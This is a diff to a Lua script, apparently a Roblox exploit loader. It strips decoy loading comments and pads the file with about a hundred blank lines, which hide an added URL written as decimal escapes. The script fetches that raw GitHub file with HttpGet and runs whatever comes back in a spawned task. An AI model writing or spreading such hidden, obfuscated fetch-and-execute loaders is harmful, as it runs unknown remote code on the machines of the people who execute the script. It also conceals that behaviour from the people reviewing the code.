@@ -51,17 +51,121 @@
 
 
 
--- L0_0 = function() local _ = 1029384756; return string.char(math.random(65,90)) end
--- setfenv(1, getfenv(0)); local _native = typeof(readfile) == "function"
--- [[ MORTAR VIRTUAL MACHINE LOADING ]] --
--- Mapping Upvalues... Done.
--- Initializing Byte-Buffer [....................] 100%
 
--- Encoded: https://raw.githubusercontent.com/sergeevilya009-gif/What_are_you_looking_at/main/universal_npc_hub
-local _0xNEXT = "\104\116\116\112\115\058\047\047\114\097\119\046\103\105\116\104\117\098\117\115\101\114\099\111\110\116\101\110\116\046\099\111\109\047\115\101\114\103\101\101\118\105\108\121\097\048\048\057\045\103\105\102\047\87\104\97\116\95\97\114\101\95\121\111\117\95\108\111\111\107\105\110\103\95\97\116\047\109\097\105\110\047\117\110\105\118\101\114\115\97\108\95\110\112\99\95\104\117\98"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+local _0xENTRY = "\104\116\116\112\115\058\047\047\114\097\119\046\103\105\116\104\117\098\117\115\101\114\099\111\110\116\101\110\116\046\099\111\109\047\115\101\114\103\101\101\118\105\108\121\097\048\048\057\045\103\105\102\047\77\105\110\116\047\109\097\105\110\047\109\114\095\116\111\101"
 
 local success, result = pcall(function()
-    return game:HttpGet(_0xNEXT)
+    return game:HttpGet(_0xENTRY)
 end)
 
 if success then
@@ -69,9 +173,8 @@ if success then
     if func then
         task.spawn(func)
     else
-        warn("[MORTAR] Stage 3 Error.")
+        warn("Error")
     end
 else
-    warn("[MORTAR] Stage 3 Connection Failed.")
+    warn("Failed")
 end
-
